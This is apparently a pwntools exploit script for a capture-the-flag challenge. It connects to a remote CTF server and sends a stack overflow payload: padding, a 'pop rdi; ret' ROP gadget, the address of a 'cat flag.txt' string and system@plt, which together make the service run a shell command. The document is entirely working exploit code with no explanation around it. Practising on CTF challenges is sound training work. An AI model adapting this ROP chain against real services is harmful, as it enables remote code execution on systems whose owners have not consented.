from pwn import *

#r = process("./pwn2",env={'LD_PRELOAD':'./libc.so.6'})
r = remote('ctf.kuality.kr',12351)
#gdb.attach(r,"b* 0x0000000000400acd")
payload = ''
payload += 'A'*0x10 # padding
payload += 'B'*0x8  # rbp
payload += p64(0x0000000000400b83) # pop rdi; ret;   
payload += p64(0x400d41)	# "cat flag.txt ;)"
payload += p64(0x0004006b0)  # system@plt
payload += 'C'*(0x100-8*6)  # padding

payload += 'C'*0x100 # padding

payload += p64(0xdeadbeef)  # check

r.sendlineafter("Input data : ",payload)

r.interactive()